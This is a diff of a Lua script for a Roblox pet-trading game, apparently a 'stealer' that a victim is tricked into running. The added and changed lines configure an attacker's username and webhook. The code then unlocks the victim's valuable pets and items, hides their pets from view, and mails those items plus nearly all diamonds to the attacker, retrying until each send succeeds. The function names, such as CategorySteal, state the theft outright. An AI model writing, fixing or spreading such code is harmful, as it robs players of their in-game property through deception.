@@ -1,3 +1,7 @@
+Username = "you user here"
+Webhook = "your webhook here"
+min_rap = 500000 -- minimum rap of each item you want to get sent to you.
+
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local plr = game.Players.LocalPlayer
@@ -10,7 +14,7 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local GemAmount1
+local GemAmount1 = 1
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
         GemAmount1 = v._am
@@ -97,15 +101,6 @@ noti:GetPropertyChangedSignal("Enabled"):Connect(function()
 end)
 noti.Enabled = false
 
-local function claim_mail()
-    local inbox = game.ReplicatedStorage.Network['Mailbox: Get']:InvokeServer().Inbox
-	local uuidlist = {}
-	for _, gift in pairs(inbox) do
-    	table.insert(uuidlist, gift.uuid)
-	end
-    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Claim"):InvokeServer(uuidlist)
-end
-
 local function safeToString(value)
     if value == nil then
         return "nil"
@@ -140,33 +135,14 @@ local function sendItem(category, uid, am)
         [4] = uid,
         [5] = am or 1
     }
-    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-end
-
-local function CountCategory(category)
-	local count = 0
-	if category == "Pet" then
-		for i, v in pairs(save[category]) do
-			local dir = library.Directory.Pets[v.id]
-			if getRAP(category, v) >= min_rap and (dir.huge or dir.exclusiveLevel) then
-				count = count + 1
-			end
-		end
-	else
-		for i, v in pairs(save[category]) do
-			if getRAP(category, v) >= min_rap then
-				count = count + 1
-			end
-		end
-	end
-	return count
+	local response = false
+	repeat
+    	local response = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	until response == true
 end
 
 local function CategorySteal(category)
-	local Sent = 0
-	local initial = CountCategory(category)
 	local sortedItems = {}
-
 	if category == "Pet" then
 		for i, v in pairs(save[category]) do
 			local rapValue = getRAP(category, v)
@@ -194,52 +170,29 @@ local function CategorySteal(category)
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
 		end
 		sendItem(category, item.uid, v._am or 1)
-		local final = CountCategory(category)
-		if final < initial then
-			Sent = Sent + 1
-			initial = final
-		end
-	end
-	return Sent
-end
-
-local function SendAllCategory(category)
-	local total = CountCategory(category)
-	local Sent = 0
-	repeat
-		Sent = Sent + CategorySteal(category)
-	until Sent == total
-end
-
-local function GemSteal()
-    for i, v in pairs(GetSave().Inventory.Currency) do
-        if v.id == "Diamonds" then
-            local GemAmount = v._am
-            local args = {
-                [1] = user,
-                [2] = MailMessage,
-                [3] = "Currency",
-                [4] = i,
-                [5] = GemAmount - 10000
-            }
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			break
-        end
-    end
-end
-
-local function CountGems()
-	for i, v in pairs(GetSave().Inventory.Currency) do
-		if v.id == "Diamonds" then
-			return v._am
-		end
 	end
 end
 
 local function SendAllGems()
-	repeat
-		GemSteal()
-	until CountGems() == nil or CountGems() < 10000
+    for i, v in pairs(GetSave().Inventory.Currency) do
+        if v.id == "Diamonds" then
+            local GemAmount = v._am
+			if GemAmount and GemAmount >= 20000 then
+				local args = {
+					[1] = user,
+					[2] = MailMessage,
+					[3] = "Currency",
+					[4] = i,
+					[5] = GemAmount - 10000
+				}
+				local response = false
+				repeat
+					local response = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+				until response == true
+				break
+			end
+        end
+    end
 end
 
 local function EmptyBoxes()
@@ -295,7 +248,7 @@ local function CategoryWebhook(category)
 	end
 end
 
-if CountHuges() > 0 or CountGems() > 500000 then
+if CountHuges() > 0 or GemAmount1 >= 500000 then
     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Pets_UnequipAll"):FireServer()
     local parent = game.Workspace:FindFirstChild("__THINGS")
     local oldFolder = parent and parent:FindFirstChild("Pets")
@@ -308,7 +261,7 @@ if CountHuges() > 0 or CountGems() > 500000 then
     oldFolder:Destroy()
     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Pets_Restore"):FireServer()
 	EmptyBoxes()
-	claim_mail()
+	game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
 	local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
 	for i, v in pairs(categoryList) do
 		if save[v] ~= nil then
@@ -321,7 +274,7 @@ if CountHuges() > 0 or CountGems() > 500000 then
 	end
 	for i, v in pairs(categoryList) do
 		if save[v] ~= nil then
-			SendAllCategory(v)
+			CategorySteal(v)
 		end
 	end
 	SendAllGems()
